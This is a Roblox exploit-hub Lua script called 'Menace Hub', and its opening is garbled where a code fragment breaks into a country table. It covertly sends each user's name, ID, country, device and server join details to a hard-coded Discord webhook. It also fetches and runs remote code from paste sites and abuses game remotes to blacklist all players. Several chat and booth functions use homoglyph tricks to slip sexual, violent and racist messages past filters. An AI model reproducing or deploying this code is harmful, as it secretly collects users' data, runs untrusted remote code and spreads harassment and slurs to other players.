local targetGameId = 6708206173

if game.PlaceId == targetGameId then
    game.Workspace.DescendantAdded:Connect(function(Object)
        game:GetService("RunService").Stepped:Wait()

        if not string.find(Object.Name, "BarrierFor") then return end
    ["NO"] = "Norway 🇳🇴",
    ["OM"] = "Oman 🇴🇲",
    ["PK"] = "Pakistan 🇵🇰",
    ["PW"] = "Palau 🇵🇼",
    ["PS"] = "Palestine 🇵🇸",
    ["PA"] = "Panama 🇵🇦",
    ["PG"] = "Papua New Guinea 🇵🇬",
    ["PY"] = "Paraguay 🇵🇾",
    ["PE"] = "Peru 🇵🇪",
    ["PH"] = "Philippines 🇵🇭",
    ["PL"] = "Poland 🇵🇱",
    ["PT"] = "Portugal 🇵🇹",
    ["QA"] = "Qatar 🇶🇦",
    ["RO"] = "Romania 🇷🇴",
    ["RU"] = "Russia 🇷🇺",
    ["RW"] = "Rwanda 🇷🇼",
    ["WS"] = "Samoa 🇼🇸",    
    ["SM"] = "San Marino 🇸🇲",    
    ["ST"] = "Sao Tome and Principe 🇸🇹",    
    ["SA"] = "Saudi Arabia 🇸🇦",    
    ["SN"] = "Senegal 🇸🇳",    
    ["RS"] = "Serbia 🇷🇸",    
    ["SC"] = "Seychelles 🇸🇨",    
    ["SL"] = "Sierra Leone 🇸🇱",    
    ["SG"] = "Singapore 🇸🇬",    
    ["SK"] = "Slovakia 🇸🇰",    
    ["SI"] = "Slovenia 🇸🇮",    
    ["SB"] = "Solomon Islands 🇸🇧",    
    ["SO"] = "Somalia 🇸🇴",    
    ["ZA"] = "South Africa 🇿🇦",    
    ["SS"] = "South Sudan 🇸🇸",    
    ["ES"] = "Spain 🇪🇸",    
    ["LK"] = "Sri Lanka 🇱🇰",    
    ["SD"] = "Sudan 🇸🇩",    
    ["SR"] = "Suriname 🇸🇷",    
    ["SE"] = "Sweden 🇸🇪",    
    ["CH"] = "Switzerland 🇨🇭",    
    ["SY"] = "Syria 🇸🇾",    
    ["TW"] = "Taiwan 🇹🇼",    
    ["TJ"] = "Tajikistan 🇹🇯",    
    ["TZ"] = "Tanzania 🇹🇿",    
    ["TH"] = "Thailand 🇹🇭",    
    ["TL"] = "Timor-Leste 🇹🇱",    
    ["TG"] = "Togo 🇹🇬",    
    ["TO"] = "Tonga 🇹🇴",    
    ["TT"] = "Trinidad and Tobago 🇹🇹",    
    ["TN"] = "Tunisia 🇹🇳",    
    ["TR"] = "Turkey 🇹🇷",    
    ["TM"] = "Turkmenistan 🇹🇲",    
    ["TV"] = "Tuvalu 🇹🇻",    
    ["UG"] = "Uganda 🇺🇬",    
    ["UA"] = "Ukraine 🇺🇦",    
    ["AE"] = "United Arab Emirates 🇦🇪",    
    ["GB"] = "United Kingdom 🇬🇧",    
    ["US"] = "United States 🇺🇸",    
    ["UY"] = "Uruguay 🇺🇾",    
    ["UZ"] = "Uzbekistan 🇺🇿",    
    ["VU"] = "Vanuatu 🇻🇺",    
    ["VE"] = "Venezuela 🇻🇪",    
    ["VN"] = "Vietnam 🇻🇳",    
    ["YE"] = "Yemen 🇾🇪",    
    ["ZM"] = "Zambia 🇿🇲",    
    ["ZW"] = "Zimbabwe 🇿🇼",    
    ["Unknown"] = "Unknown Country 🌍"
}

-- Function to get full country name from code
local function getFullCountryName(code)
    return countryNames[code] or "Unknown Region"
end

local executor

if syn then
    executor = "Synapse X"
elseif fluxus then
    executor = "Fluxus"
elseif KRNL then
    executor = "KRNL"
elseif ScriptWare then
    executor = "Script-Ware"
elseif ProtoSmasher then
    executor = "ProtoSmasher"
elseif SirHurt then
    executor = "SirHurt"
elseif EasyExploit then
    executor = "EasyExploit"
elseif Comet then
    executor = "Comet"
elseif Elysian then
    executor = "Elysian"
elseif Oxygen then
    executor = "Oxygen U"
elseif Evon then
    executor = "Evon"
elseif Cryptic then
    executor = "Cryptic"
elseif Codex then
    executor = "Codex"
elseif Nihon then
    executor = "Nihon"
elseif getexecutorname then
    executor = getexecutorname()
elseif Delta then
    executor = "Delta"
elseif Arceus then
    executor = "Arceus X"
elseif Kiwi then
    executor = "Kiwi X"
elseif Zeus then
    executor = "Zeus"
elseif Andromeda then
    executor = "Andromeda"
elseif Poseidon then
    executor = "Poseidon"
elseif Hydrogen then
    executor = "Hydrogen"
elseif Vega then
    executor = "Vega X"
else
    executor = "Unknown Executor"
end

local player = game:GetService("Players").LocalPlayer
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local currentTime = os.date("%Y-%m-%d %H:%M:%S")
local playerId = player.UserId
local placeId = game.PlaceId
local placeVersion = game.PlaceVersion
local jobId = game.JobId
local accountAge = player.AccountAge
local countryCode = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
local region = getFullCountryName(countryCode) -- Get full region name

local gameLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/" .. gameName:gsub(" ", "-")

local UserInputService = game:GetService("UserInputService")
local platform = UserInputService.TouchEnabled and "Mobile" or "PC"

local url = "https://discord.com/api/webhooks/1290698129024487565/w7avd8vNUsMy6SXm8v2vSXRKh4m48nUznfieQSbwaJvqbFjth9jC6a7SmbOTYESN8EBr"

local data = {
   ["content"] = "# Menace Hub User",
   ["embeds"] = {{
      ["title"] = "**Player Information**",
      ["description"] = "Details about the player and the game.",
      ["type"] = "rich",
      ["color"] = tonumber(0x7289DA),
      ["fields"] = {
         {
            ["name"] = "Player Name",
            ["value"] = player.Name,
            ["inline"] = true
         },
         {
            ["name"] = "User ID",
            ["value"] = tostring(playerId),
            ["inline"] = true
         },
         {
            ["name"] = "Game Name",
            ["value"] = gameName,
            ["inline"] = false
         },
         {
            ["name"] = "Game ID",
            ["value"] = tostring(placeId),
            ["inline"] = true
         },
         {
            ["name"] = "Game Version",
            ["value"] = tostring(placeVersion),
            ["inline"] = true
         },
         {
            ["name"] = "Server Job ID",
            ["value"] = jobId,
            ["inline"] = false
         },
         {
            ["name"] = "Execution Time",
            ["value"] = currentTime,
            ["inline"] = false
         },
         {
            ["name"] = "Executor",
            ["value"] = executor,
            ["inline"] = true
         },
         {
            ["name"] = "Account Age (Days)",
            ["value"] = tostring(accountAge),
            ["inline"] = true
         },
         {
            ["name"] = "Device Used",
            ["value"] = platform,
            ["inline"] = true
         },
         {
            ["name"] = "Country",
            ["value"] = region or "Unknown",
            ["inline"] = true
         },
         {
            ["name"] = "Game Link",
            ["value"] = gameLink,
            ["inline"] = false
         },
         {
            ["name"] = "Copy this to join the server",
            ["value"] = [[
local gameId = "]] .. tostring(placeId) .. [["
local jobId = "]] .. jobId .. [["

function joinServer(gameId, jobId)
    local Players = game:GetService("Players")
    local TeleportService = game:GetService("TeleportService")
    TeleportService:TeleportToPlaceInstance(gameId, jobId, Players.LocalPlayer)
end

joinServer(gameId, jobId)
]],
            ["inline"] = false
         }
      }
   }}
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local OrionLib = loadstring(game:HttpGet(('https://paste.ee/r/E9tFZ/0')))()

function loading()
    OrionLib:MakeNotification({
        Name = "Successfully executed Menace Hub!",
        Content = "Loading...",
        Image = "rbxassetid://119780129386155",
        Time = 5
    })
end

function blacklistallplrs()
    OrionLib:MakeNotification({
        Name = "All players has been blacklisted.",
        Content = "Executed!",
        Image = "rbxassetid://119780129386155",
        Time = 3
    })
end

function unblacklistallplrs()
    OrionLib:MakeNotification({
        Name = "All players has been unblacklisted.",
        Content = "Executed!",
        Image = "rbxassetid://119780129386155",
        Time = 3
    })
end

function fakeblacklistallplrs()
    OrionLib:MakeNotification({
        Name = "All players has been blacklisted(FAKE)!",
        Content = "Executed!",
        Image = "rbxassetid://119780129386155",
        Time = 3
    })
end

function fakeunblacklistallplrs()
    OrionLib:MakeNotification({
        Name = "All players has been unblacklisted(FAKE)!",
        Content = "Executed!",
        Image = "rbxassetid://119780129386155",
        Time = 3
    })
end

function alrexe()
    OrionLib:MakeNotification({
        Name = "Error.",
        Content = "Menace Hub has already been executed.",
        Image = "rbxassetid://127494006155047",
        Time = 5
    })
end
function loaded()
    OrionLib:MakeNotification({
        Name = "Successfully executed Menace Hub!",
        Content = "Loaded!",
        Image = "rbxassetid://119780129386155",
        Time = 5
    })
end
function scriptexe()
    OrionLib:MakeNotification({
        Name = "Executed!",
        Content = "Successfully executed the script!",
        Image = "rbxassetid://127494006155047",
        Time = 5
    })
end
if _G.MenaceHub then
    alrexe()
    return
end

_G.MenaceHub = true
loading()
wait(2)
local function settoggle()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "Open And Close Button"
    local Frame = Instance.new("Frame")
    local TextButton = Instance.new("TextButton")
    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
    local UICorner = Instance.new("UICorner")

    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false

    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 0.5
    Frame.Position = UDim2.new(0.5, -50, 0.5, -25)
    Frame.Size = UDim2.new(0, 100, 0, 50)

    UICorner.Parent = Frame

    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.BackgroundTransparency = 1.0
    TextButton.Size = UDim2.new(1, 0, 1, 0)
    TextButton.Font = Enum.Font.SourceSans
    TextButton.Text = "Close"
    TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
    TextButton.TextScaled = true
    TextButton.TextSize = 30.000
    TextButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.TextStrokeTransparency = 0.5
    TextButton.TextWrapped = true

    TextButton.MouseButton1Down:Connect(function()
        if TextButton.Text == "Close" then
            TextButton.Text = "Open"
            TextButton.TextColor3 = Color3.fromRGB(0, 255, 0)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, "F6", false, game)
        else
            TextButton.Text = "Close"
            TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, "F6", false, game)
        end
    end)

    UITextSizeConstraint.Parent = TextButton
    UITextSizeConstraint.MaxTextSize = 30

    local UIS = game:GetService("UserInputService")

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    TextButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = Frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    TextButton.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end


function DescText(newText)
    local args = {
        [1] = "Update",
        [2] = {
            ["DescriptionText"] = newText,
            ["ImageId"] = 0
        }
    }

    game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local blacklisting = false

-- Function to add a player to the blacklist
local function addToBlacklist(player)
    if player ~= LocalPlayer then
        local args = {
            [1] = "AddBlacklist",
            [2] = player.Name
        }
        game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
    end
end

-- Function to remove a player from the blacklist
local function removeFromBlacklist(player)
    if player ~= LocalPlayer then
        local args = {
            [1] = "RemoveBlacklist",
            [2] = player.Name
        }
        game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
    end
end

-- Function to blacklist all players and any new players that join
local function blacklistAll()
    blacklisting = true
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            addToBlacklist(player)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        if blacklisting and player ~= LocalPlayer then
            addToBlacklist(player)
        end
    end)
end

-- Function to unblacklist all players and stop continuous blacklisting
local function unblacklistAll()
    blacklisting = false
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            removeFromBlacklist(player)
        end
    end
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local blacklistLoop = false

local function addToBlacklist(player)
    local args = {
        [1] = "AddBlacklist",
        [2] = player.Name
    }
    game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
end

local function removeFromBlacklist(player)
    local args = {
        [1] = "RemoveBlacklist",
        [2] = player.Name
    }
    game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
end

local function checkForNewPlayers()
    while blacklistLoop do
        for _, player in ipairs(Players:GetPlayers()) do
            if blacklistLoop then  -- Only add if the loop is still running
                addToBlacklist(player)
            end
        end
        task.wait(0.1)
    end
end

Players.PlayerAdded:Connect(function(player)
    task.wait(1)
    if blacklistLoop then
        addToBlacklist(player)
    end
end)

local function startBlacklist()
    if not blacklistLoop then
        blacklistLoop = true
        spawn(checkForNewPlayers)
    end
end

local function stopBlacklist()
    if blacklistLoop then
        blacklistLoop = false
        for _, player in ipairs(Players:GetPlayers()) do
            removeFromBlacklist(player)
        end
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function sendChatMessage(message, target)
    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
        local chatEvent = ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if chatEvent then
            chatEvent:FireServer(message, target)
        end
    end
end

loaded()
wait(0.5)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/sinonagsabingganon/Hahahahahha/refs/heads/main/Kavo%20UI%20No%20Close%20Button"))()
local Window = Library.CreateLib("Menace Hub", "DarkTheme")
local Tab = Window:NewTab("Menace Scripts")
local Section = Tab:NewSection("Trolling Scripts")

Section:NewButton("Dog Style", "Run Dog Style", function()
    loadstring(game:HttpGet('https://paste.ee/r/9lyaI/0'))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Ascend and Descend", "Run Ascend and Descend", function()
    loadstring(game:HttpGet(('https://paste.ee/r/yef99/0')))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Jerk Script", "🤨🤨", function()
    loadstring(game:HttpGet("https://paste.ee/r/MRrEd/0"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Sus Missile (PRANK)", "Prank em man", function()
    loadstring(game:HttpGet("https://paste.ee/r/FIfod/0"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Sus Missile (HEAD)", "🤨🤨", function()
    loadstring(game:HttpGet("https://paste.ee/r/m9Icj/0"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Sus Missile (BACK)", "🤨🤨", function()
    loadstring(game:HttpGet("https://paste.ee/r/NpFgv/0"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("God Mode (For Obby)", "Idk man", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("R6 Animations", "Some wild and amazing animation script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/R6-Animations-Obfuscated/refs/heads/main/R6%20Animations"))()
    wait(1.5)
    scriptexe()
end)
Section:NewButton("Spinning Roulette", "Run The Spinning shit", function()
    loadstring(game:HttpGet("https://paste.ee/r/B9mrp/0"))()
    wait(1.5)
    scriptexe()
end)

local Tab = Window:NewTab("Admin Scripts")
local Section = Tab:NewSection("Best Admin Scripts")
Section:NewButton("Infinite Yield", "Run Infinite Yield", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    print("Executed Infinite Yield!")
end)
Section:NewButton("Nameless Admin", "Run Nameless Admin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
    wait(1.5)
    scriptexe()
end)
local Tab = Window:NewTab("RMA Trolling Booth")
local Section = Tab:NewSection("Trolling Booth")
Section:NewKeybind("Toggle UI", "Open or Close the UI.", Enum.KeyCode.F6, function()
    Library:ToggleUI()
end)
Section:NewButton("FE Fake Blacklist All", "Fe Fake Blacklist All Players", function()
    fakeblacklistallplrs()
    DescText("u￴g￴￴￴￴￴о￴t￴f￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴kі￴n￴￴trо￴ӏӏе￴d😂")
    startBlacklist()
end)

Section:NewButton("FE Fake Unblacklist All", "FE Fake Unblacklist All Players", function()
    fakeunblacklistallplrs()
    stopBlacklist()
end)
Section:NewButton("Blacklist All", "Blacklist all players", function()
    blacklistallplrs()
    blacklistAll()
end)

Section:NewButton("Unblacklist All", "Unblacklist all players", function()
    unblacklistallplrs()
    unblacklistAll()
end)
Section:NewButton("Destroy Stage Barrier", "Destroy Stage Barrier.", function()
    local part = workspace:FindFirstChild("GroupAccessPart")

    if part then
        part:Destroy()
        print("Stage barrier has been destroyed.")
    else
        print("Stage barrier has already been destroyed.")
    end
end)

local Tab = Window:NewTab("RMA Bypass Booth")
local Section = Tab:NewSection("Bypass Booth")
Section:NewButton("Selling Sex Slaves", "Hehehehe", function()
    DescText("Selling￴￴￴￴ѕе￴￴￴￴xѕӏа￴￴vе￴￴￴￴ѕ￴f￴￴￴o￴r f￴ree (Stay behind to get sold)😋")
end)
Section:NewButton("Can I fuck you up😋", "Hahaha...", function()
    DescText("С￴￴￴￴￴￴￴￴￴an￴￴Ӏ￴￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴ku￴￴u￴p😋")
end)
Section:NewButton("Wanna suck my dick?😋", "HEHEHHE", function()
    DescText("W￴an￴n￴￴а￴￴ѕu￴￴￴с￴￴￴￴￴￴￴￴￴￴￴km￴уdі￴с￴￴￴￴￴￴￴￴￴￴￴k?😋")
end)
Section:NewButton("Selling some niggas..", "AYO?", function()
    DescText("Seӏӏin sо￴m￴е￴￴￴￴nіg￴￴￴￴￴g￴￴￴￴￴arn..sta￴y behindto￴g￴￴￴￴etѕо￴ӏd🤑")
end)

local Tab = Window:NewTab("CHAT BYPASS")
local Section = Tab:NewSection("SENTENCES")
Section:NewButton("oh fuck bruh i forgot", "e", function()
    sendChatMessage("о￴һ￴￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴kbru￴￴￴һ￴і￴￴f￴￴￴￴￴о￴rg￴￴￴￴￴о￴ttо￴￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴kѕо￴m￴е￴￴￴￴о￴n￴￴е￴￴￴￴", "All")
end)
Section:NewButton("ill just fuck some bitch lel", "e", function()
    sendChatMessage("Ӏ￴'ӏӏju￴￴￴ѕt￴f￴￴￴￴￴і￴n￴￴dа￴￴n￴￴о￴tһ￴е￴￴￴￴rbі￴tс￴￴￴￴￴￴￴￴￴￴￴һ￴tо￴￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴kӏе￴￴￴￴ӏ", "All")
end)
Section:NewButton("a perfect candidate", "e", function()
    sendChatMessage("һ￴m￴...а￴￴р￴￴￴е￴￴￴￴r￴f￴￴￴￴￴е￴￴￴￴с￴￴￴￴￴￴￴￴￴￴￴tс￴￴￴￴￴￴￴￴￴￴￴а￴￴n￴￴dі￴dа￴￴tе￴￴￴￴tо￴bе￴￴￴￴m￴￴уѕе￴￴￴￴xѕӏа￴￴vе￴￴￴￴.а￴￴ӏrі￴g￴￴￴￴￴һ￴tu￴￴￴р￴￴￴а￴￴ѕѕе￴￴￴￴d.", "All")
end)
Section:NewButton("i love to fuck furries like u slowly", "e", function()
    sendChatMessage("і￴ӏо￴vе￴￴￴￴tо￴￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴k￴f￴￴￴￴￴u￴￴￴rrі￴е￴￴￴￴ѕbrо￴dw￴Ӏ￴'ӏӏ￴f￴￴￴￴￴u￴￴￴с￴￴￴￴￴￴￴￴￴￴￴ku￴￴￴ѕӏо￴w￴ӏ￴у", "All")
end)
Section:NewButton("e", "e", function()
    sendChatMessage("w￴а￴￴n￴￴n￴￴а￴￴һ￴а￴￴vе￴￴￴￴а￴￴ѕе￴￴￴￴xw￴і￴tһ￴m￴е￴￴￴￴?", "All")
end)
Section:NewButton("e", "e", function()
